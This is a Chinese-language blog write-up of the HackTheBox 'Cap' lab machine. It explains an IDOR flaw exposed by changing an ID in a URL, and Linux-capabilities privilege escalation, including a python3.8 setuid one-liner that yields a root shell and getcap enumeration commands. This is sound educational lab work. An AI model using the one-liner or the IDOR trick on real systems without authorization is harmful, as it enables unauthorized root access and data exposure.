---
title: HackTheBox靶机Cap记录
description:
date: 2026-05-09
tags:
  - 打靶机
  - 渗透测试
---

# 一.介绍

第一次打hackthebox的靶机，先打个easy试试

靶机不难，配置网络花了点时间

htb的靶机没法直接访问IP，要连VPN进入htb的内网才能访问

可以下载openVPN Connect连接VPN，挺方便的

下载地址：[https://openvpn.net/client/](https://openvpn.net/client/)

​![image](image-20260509164145-1tqsc3x.png)​

个人觉得htb靶机的Guided Mode（引导模式）挺好的，实在没思路的时候可以用这个模式

# 二.靶机

靶机没什么特别的，扫描端口，访问控制漏洞，流量分析，得到账号密码，利用Linux Capabilities配置不当权限提升

这里记录下IDOR和Linux Capabilities配置不当权限提升

## 1.IDOR

### 介绍

IDOR(Insecure Direct Object Reference,不安全的直接对象引用)，是一种访问控制漏洞

简单来说，就是用户可以通过修改“编号”访问不属于自己权限的数据

​服务器只检查了​​用户传了什么“编号”，没有检查用户是否有访问权限

### 例子

这个靶机中就是，原本url是：http://10.129.57.193/data/1

把url改成http://10.129.57.193/data/0后可以直接访问其他用户的敏感数据

> ✏️ Note
> 
> 一句话总结
> 
> IDOR 就是：通过修改对象编号，越权访问本不属于自己的数据。

## 2.Linux Capabilities配置不当权限提升

### 介绍

简单来说，就是利用拥有特殊权限​的普通程序​提权

在 Linux 里，很多高权限操作原本只有 root​ 能做。  
后来系统把这些权限拆成了很多小块，这些小块就叫 ​Capabilities​，比如：

- ​cap_setuid​：允许修改进程 UID
- ​cap_net_bind_service​：允许绑定低端口
- ​cap_sys_admin​：很强、很危险的一类管理权限

这样做本来是为了更细粒度地授权，减少直接给 root​ 的情况。

但如果给错了程序，就可能出事。

### 例子

这个靶机中这条命令的结果是：

```bash
getcap /usr/bin/python3.8
```

输出：

```shell
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

这表示 python3.8​ 被赋予了 cap_setuid​ 权限。

普通用户这时就可以运行：

```bash
import os
os.setuid(0)
os.system("/bin/bash")
```

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

就会直接拿到一个 root shell​。

### 怎么快速找到capabilities配置不当的程序？

​getcap​的作用就是查看文件的capabilities​，

在有授权的靶机 / CTF里，最常见的第一步就是：

```bash
getcap -r / 2>/dev/null
```

想快一点，也可以先扫常见二进制目录：

```bash
getcap -r /usr /bin /sbin /usr/local 2>/dev/null
```

还可以顺手看一下当前 shell / 某个进程有没有 capability，辅助判断环境：

```bash
capsh --print      # 查看当前 shell / 当前进程上下文的 capabilities 状态，更全面
getpcaps 0         # 查看当前正在执行该命令的进程本身拥有的 capabilities
getpcaps <PID>     # 查看指定 PID 进程拥有的 capabilities
```

总之

```bash
先 getcap -r / 枚举
再筛 cap_setuid / cap_sys_admin / cap_dac_*
再看看当前 shell / 某个进程有没有 capability
```


